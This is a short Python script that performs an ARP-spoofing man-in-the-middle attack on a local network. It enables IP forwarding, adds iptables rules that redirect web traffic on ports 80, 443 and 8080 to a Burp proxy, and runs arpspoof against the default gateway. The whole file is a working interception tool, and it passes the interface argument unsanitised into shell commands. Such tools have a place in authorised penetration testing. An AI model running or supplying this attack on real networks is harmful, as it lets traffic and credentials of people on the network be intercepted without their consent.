#!/usr/bin/python3

# @yayip_

from optparse import OptionParser
import os, sys, subprocess, netifaces

usage = sys.argv[0] + " -i [iface] "
parser = OptionParser(usage)
parser.add_option("-i","--iface",
                  dest="iface", default=True, metavar="iface", help="MITM Interface")
(options, args) = parser.parse_args()

def add_rules():
	# sys forwarding
	os.system("sysctl net.ipv4.ip_forward=1")
	# firewall redirection to burp
	os.system("sudo iptables -A FORWARD --in-interface " + options.iface + " -j ACCEPT")
	os.system("sudo iptables -t nat -A PREROUTING -i " + options.iface + " -p tcp -m multiport --dport 80,443,8080 -j REDIRECT --to-port 8080")

def remove_rules():
	os.system("sudo iptables -D FORWARD --in-interface " + options.iface + " -j ACCEPT")
	os.system("sudo iptables -D PREROUTING -t nat -i " + options.iface + " -p tcp -m multiport --dport 80,443,8080 -j REDIRECT --to-port 8080")

def get_gateway():
	gws = netifaces.gateways()['default'][netifaces.AF_INET]
	if gws[1] == options.iface:
		return gws[0]
	else:
		print ("Gateway not Found !")
		exit()

def mitm_process(gateway):
	os.system("arpspoof -i " + options.iface + " " + gateway)

def requirements_installation():
	os.system("pip install netifaces")
	arpspoof = subprocess.call(["which", "arpspoof"])
	if arpspoof != 0:
	    print("arpspoof not installed!")
	    os.system("apt install dsniff")

try:
	if __name__ == '__main__':
		if options.iface != True:
			requirements_installation()
			add_rules()
			mitm_process(get_gateway())
		else:
			print (sys.argv[0] + " -i [iface]")
except KeyboardInterrupt:
	remove_rules()
except:
	pass
